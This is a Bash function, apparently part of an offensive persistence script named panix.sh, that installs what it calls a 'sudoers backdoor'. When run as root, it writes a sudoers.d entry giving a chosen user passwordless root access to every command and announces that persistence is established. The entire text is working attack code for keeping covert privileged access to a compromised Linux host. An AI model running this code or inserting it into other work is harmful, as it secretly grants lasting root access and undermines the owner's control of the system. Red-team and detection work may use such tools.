setup_sudoers_backdoor() {
	local username=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_sudoers_backdoor() {
		echo "Usage: ./panix.sh --sudoers-backdoor [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --sudoers --username <username>"
				exit 0
				;;
			--help|-h)
				usage_sudoers_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --sudoers-backdoor: $1"
				echo "Try './panix.sh --sudoers-backdoor --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --sudoers-backdoor --help' for more information."
		exit 1
	fi

	echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username can now run all commands without a sudo password."
	else
		echo "[-] Failed to create sudoers backdoor for user $username."
		exit 1
	fi
	echo "[+] Sudoers backdoor persistence established!"
}
